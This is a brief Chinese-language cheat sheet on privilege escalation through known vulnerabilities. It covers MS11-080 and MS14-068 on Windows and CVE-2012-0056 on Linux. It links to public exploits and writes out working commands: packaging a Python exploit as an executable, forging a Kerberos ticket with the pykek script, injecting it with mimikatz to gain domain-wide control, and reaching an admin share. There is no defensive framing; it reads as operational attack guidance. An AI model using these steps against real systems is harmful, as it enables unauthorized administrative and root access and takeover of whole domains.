# 利用漏洞提权

## 0x01 Windows

### ms11-080(kb2592799)
> 参考: https://technet.microsoft.com/library/security/ms11-080 (仅适用英文版64位系统, 中文版直接造成ddos)

#### 把python的exp转可直接执行的格式 
> 参考: https://github.com/smartFlash/pySecurity/blob/master/zh-cn/0x4.md

```
pip install 

python pyinstaller --onefile yourprogram.py
或可以
pyinstaller --onefile yourprogram.py

之后可以尝试: 
exp.exe -O XP
```

### ms14-068((3011780))
> 用于域环境中的普通用户的提权.
> exp地址: https://github.com/bidord/pykek 

```
ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>

生成类似
TGT_user1@lab.com.ccache的登录票据

拷贝 TGT_user1@lab.com.ccache 到windows系统

mimikatz.exe log "kerberos::ptc TGT_user@lab.com.ccache" exit

提权之后可以管理整个域
比如查看共享
net use \\domainName\admin&
```

## 0x02 Linux 提权
### CVE-2012-0056 
> 参考: http://blog.zx2c4.com/749
> 如果使用老版系统实验不能apt install gcc , 可以

```
sudo apt-cdrom add && sudo apt-get install gcc
```
条件:
+ kernels >=2.6.39, 但又不能太新.
+ 存在漏洞的系统, 直接执行exp即可获得root权限
